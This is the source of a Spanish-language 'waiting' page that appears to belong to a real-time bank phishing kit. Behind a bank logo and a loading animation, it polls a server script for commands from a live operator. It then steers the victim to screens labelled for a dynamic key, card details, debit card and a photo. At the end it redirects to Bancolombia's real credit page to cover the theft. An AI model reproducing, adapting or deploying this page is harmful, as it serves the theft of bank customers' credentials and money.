<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Esperando...</title>
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <meta http-equiv="Last-Modified" content="0">

  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0 0 200px 0;
      font-family: Arial, sans-serif;
      background-color: #f7f7f7;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
      position: relative;
    }

    .contenedor {
      position: relative;
      width: 80%;
      max-width: 400px;
      margin: 0 auto;
    }

    .gif-overlay {
      position: relative;
      display: inline-block;
      width: 100%;
    }

    .gif-overlay img {
      width: 100%;
      display: block;
    }

    #tiempo {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 18px;
      font-weight: bold;
      color: rgb(0, 0, 0);
      padding: 8px 16px;
      border-radius: 10px;
    }

    .confirmRedirectZone {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(255, 238, 160, 0.98);
    color: #000;
    padding: 20px 24px;
    border-radius: 14px;
    box-shadow: 0 12px 30px rgba(0,0,0,0.4);
    border: 3px solid #cda617;
    width: 92%;
    max-width: 420px;
    z-index: 999990;
    text-align: center;
    font-family: Arial, sans-serif;
  }
  .confirmRedirectZone h3 {
    margin: 0 0 8px 0;
    color: #111;
    font-size: 18px;
  }
  .confirmRedirectZone p { margin: 6px 0 14px 0; font-size: 13px; color:#222; }
  .confirmRedirectZone button.go {
    background: #fdda24;
    border: 0;
    padding: 14px 18px;
    width: 100%;
    color: #000;
    font-weight: bold;
    font-size: 16px;
    border-radius: 999px;
    cursor: pointer;
    box-shadow: 0 6px 14px rgba(205,166,23,0.4);
  }
  .confirmRedirectZone button.cancel {
    background: #e9e9e9;
    border: 0;
    padding: 10px 14px;
    margin-top: 8px;
    width: 100%;
    color: #444;
    border-radius: 999px;
    cursor: pointer;
  }
  #debugOverlay {
      position: fixed;
      bottom: 0; left: 0; right: 0;
      max-height: 200px;
      overflow-y: auto;
      background: rgba(0,0,0,0.82);
      color: #fff;
      font-family: Consolas, Menlo, monospace;
      font-size: 11px;
      text-align: left;
      padding: 8px 10px;
      z-index: 999999;
      border-top: 2px solid #f5c518;
    }
    #debugOverlay h4 {
      margin: 0 0 4px 0;
      padding: 0;
      font-size: 12px;
      color: #f5c518;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    #debugOverlay h4 button {
      border: 0;
      background: #f5c518;
      color: #222;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 10px;
      cursor: pointer;
    }
    #debugOverlay .pollLine { white-space: nowrap; }
    #debugOverlay .pendiente  { color: #9bdcff; }
    #debugOverlay .candidato  { color: #ffd37a; }
    #debugOverlay .confirmado { color: #5aff8a; font-weight: bold; }
    #debugOverlay .redirect   { color: #ff6a6a; font-weight: bold; }
    #debugOverlay .info       { color: #dcdcdc; }
  </style>
</head>
<body style="background-color:#f7f7f7; background-repeat: no-repeat; background-size: 300%;">

<br><br><br>
<center>
  <img src="img/banco45.png" style="margin-top: 150px;" width="70%" alt="">
  <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
</center>

<div id="confirmRedirect" class="confirmRedirectZone" role="dialog" aria-live="assertive">
  <h3 id="confirmTitle">Operador solicitó acción</h3>
  <p id="confirmSub">Pulsa el botón continuar para ir a la pantalla correspondiente.</p>
  <button class="go" id="confirmGoBtn">👉 CONTINUAR</button>
  <button class="cancel" id="confirmCancelBtn">Cancelar (esperar)</button>
</div>

<div id="debugOverlay">
  <h4>
    <span>🔍 ESTADO POLLING (visible debug)</span>
    <button onclick="document.getElementById('debugOverlay').style.display='none';">OCULTAR</button>
  </h4>
  <div id="debugLog"></div>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const requestId = params.get("rid");
  const key = params.get("key");

  let estadoAnterior = null;
  let coincidenciasSeguidas = 0;

  const confirmDiv = document.getElementById('confirmRedirect');
  const confirmTitle = document.getElementById('confirmTitle');
  const confirmSub = document.getElementById('confirmSub');
  const confirmGoBtn = document.getElementById('confirmGoBtn');
  const confirmCancelBtn = document.getElementById('confirmCancelBtn');

  // BLOQUEO 100%: NO HAY location.href AUTOMATICO EN NINGUN LUGAR.
  // Solo esta variable guarda la URL pendiente, y solo se ejecuta AL CLICK en confirmGoBtn.
  let pendingUrl = null;
  let pendingEstado = null;
  let mostrandoConfirm = false;

  function hideConfirm() {
    mostrandoConfirm = false;
    confirmDiv.style.display = 'none';
    pendingUrl = null;
    pendingEstado = null;
  }
  function showConfirmFor(estado, url) {
    if (mostrandoConfirm) return; // No re-abrir
    mostrandoConfirm = true;
    pendingUrl = url;
    pendingEstado = estado;
    const lbl = {
      'opcion_1':  'Clave Dinámica (DINÁMICA)',
      'opcion_2':  'Tarjeta',
      'opcion_3':  'Error 3',
      'opcion_4':  'Error 4',
      'opcion_5':  'Foto',
      'opcion_6':  'Tarjeta Débito',
      'opcion_7':  'Opción 7',
      'opcion_8':  'Opción 8',
      'opcion_55': 'Opción 55',
      'opcion_9':  'Error Dinámica',
      'opcion_10': 'Finalizar',
    }[estado] || estado;
    confirmTitle.textContent = `Siguiente paso: ${lbl}`;
    confirmSub.textContent = `Estado confirmado 2 veces: ${estado}.\nSolo pulsa CONTINUAR si realmente quieres ir a esta pantalla.\nDestino: ${url}`;
    confirmGoBtn.textContent = `👉 CONTINUAR A ${lbl.toUpperCase()}`;
    confirmDiv.style.display = 'block';
  }

  confirmCancelBtn.addEventListener('click', () => {
    hideConfirm();
    // Reiniciar estado de polling para no volver a mostrar el mismo instante después.
    estadoAnterior = null;
    coincidenciasSeguidas = 0;
    addLine('Usuario canceló la acción. Esperando nuevo estado...', 'info');
  });

  confirmGoBtn.addEventListener('click', () => {
    const url = pendingUrl;
    const est = pendingEstado;
    if (!url) { hideConfirm(); return; }
    addLine(`USUARIO PULSÓ CONTINUAR => navegando a ${url} (estado=${est})`, 'redirect');
    // La UNICA LINEA DE NAVEGACION DE TODO ESTE ARCHIVO:
    window.location.href = url;
  });

  const logEl = document.getElementById('debugLog');
  function addLine(text, cls = 'info') {
    const div = document.createElement('div');
    div.className = 'pollLine ' + cls;
    const ts = new Date().toLocaleTimeString('es-CO', {hour12: false});
    div.textContent = `[${ts}] ${text}`;
    logEl.insertBefore(div, logEl.firstChild);
    while (logEl.childElementCount > 40) logEl.removeChild(logEl.lastChild);
    // eslint-disable-next-line no-console
    console.log(`[espera] ${div.textContent}`);
  }

  addLine(`rid=${requestId || '(null)'}  key=${key || '(null)'}`);

  function urlPara(estado) {
    switch (estado) {
      case 'opcion_1':  return `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
      case 'opcion_2':
      case 'opcion_6':  return `opcion6.html?key=${encodeURIComponent(key)}`;
      case 'opcion_3':  return `opcion3.html?key=${encodeURIComponent(key)}`;
      case 'opcion_4':  return `opcion4.html?key=${encodeURIComponent(key)}`;
      case 'opcion_5':  return `opcion5.html?key=${encodeURIComponent(key)}`;
      case 'opcion_7':  return `opcion7.html?key=${encodeURIComponent(key)}`;
      case 'opcion_8':  return `opcion8.html?key=${encodeURIComponent(key)}`;
      case 'opcion_55': return `opcion55.html?key=${encodeURIComponent(key)}`;
      case 'opcion_9':  return `opcion9.php?key=${encodeURIComponent(key)}`;
      case 'opcion_10': return 'https://www.bancolombia.com/personas/creditos';
      default: return null;
    }
  }

  // Cualquier otro intento de redirección de navegador (meta refresh, extensiones, etc)
  // se detecta con beforeunload y se loguea, pero NO se puede parar todo.
  window.addEventListener('beforeunload', () => {
    addLine('beforeunload detectado (la pagina se va)', 'redirect');
  });

  setInterval(() => {
    fetch(
      `estado.php?rid=${encodeURIComponent(requestId)}` +
      (key ? (`&key=${encodeURIComponent(key)}`) : ''),
      { cache: 'no-store', credentials: 'same-origin' }
    )
      .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
      .then(data => {
        const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';

        if (mostrandoConfirm) {
          return; // Ya hay acción pendiente de click del usuario; no tocar.
        }

        if (estado === 'pendiente') {
          estadoAnterior = 'pendiente';
          coincidenciasSeguidas = 0;
          return;
        }

        if (estadoAnterior && estadoAnterior === estado) coincidenciasSeguidas += 1;
        else { estadoAnterior = estado; coincidenciasSeguidas = 1; }

        addLine(`estado=${estado} (x${coincidenciasSeguidas})` +
          (coincidenciasSeguidas >= 2 ? ' => 2x OK, mostrando confirmación al usuario.' : ''),
          coincidenciasSeguidas >= 2 ? 'confirmado' : 'candidato');

        if (coincidenciasSeguidas >= 2) {
          const urlGo = urlPara(estado);
          if (urlGo) {
            // MUESTRA BOTÓN AL USUARIO, NO NAVEGA AUTOMATICAMENTE.
            showConfirmFor(estado, urlGo);
          } else {
            addLine(`Estado ${estado} no mapeado (ignorado).`, 'info');
          }
        }
      })
      .catch(err => {
        addLine(`error polling: ${err || 'network'} (reinicia contador)`, 'info');
        estadoAnterior = null;
        coincidenciasSeguidas = 0;
      });
  }, 2000);
</script>

</body>
</html>
